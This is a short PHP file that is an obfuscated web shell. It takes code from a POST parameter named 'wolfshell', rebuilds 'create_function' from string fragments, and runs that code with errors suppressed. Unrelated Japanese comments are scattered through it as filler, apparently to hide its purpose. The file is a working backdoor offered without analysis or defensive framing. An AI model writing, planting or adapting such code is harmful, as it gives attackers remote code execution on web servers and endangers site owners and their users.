<?php
$a81f_x = 'filter_input';
// 月が綺麗ですね
$b92c_y = INPUT_POST;
$c03d_z = ['w','o','l','f','s','h','e','l','l'];
// 今日の天気は晴れです
$d14e_w = $a81f_x($b92c_y, implode('', $c03d_z));
$e25f_v = ['cr', 'ea', 'te', '_', 'fu', 'nc', 'ti', 'on'];
if ($d14e_w) {
    // これはペンです
    $f36g_u = join('', $e25f_v);
    $g47h_t = @$f36g_u('', $d14e_w);
    // ありがとうございました
    @$g47h_t();
}
?>